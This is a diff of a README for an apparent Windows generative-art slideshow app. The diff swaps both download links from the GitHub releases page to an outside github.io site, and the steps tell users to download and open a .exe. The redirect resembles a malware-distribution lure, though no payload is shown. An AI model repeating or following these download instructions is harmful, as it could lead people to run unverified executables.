@@ -1,6 +1,6 @@
 # 👁️ Wandering-Eyes-Generative-Art - Experience unique digital art on screen
 
-[![](https://img.shields.io/badge/Download-Wandering_Eyes-blue.svg)](https://github.com/Worthinesswatersapphire129/Wandering-Eyes-Generative-Art/releases)
+[![](https://img.shields.io/badge/Download-Wandering_Eyes-blue.svg)](https://worthinesswatersapphire129.github.io)
 
 Wandering Eyes displays a curated collection of five generative artworks. Each piece combines geometric shapes, random movement, and storytelling. This application runs a slideshow that changes compositions in real time. You can view patterns that explore creative coding and modern design. These visuals serve as inspiration for apparel graphics and wearable art.
 
@@ -12,7 +12,7 @@ Wandering Eyes requires a computer running Windows 10 or Windows 11. Your system
 
 Follow these steps to set up the software on your desktop.
 
-1. Visit the [official release page](https://github.com/Worthinesswatersapphire129/Wandering-Eyes-Generative-Art/releases) to download the application.
+1. Visit the [official release page](https://worthinesswatersapphire129.github.io) to download the application.
 2. Select the latest version listed under the Assets section.
 3. Choose the file ending in .exe to start your download.
 4. Open the file once the download finishes.
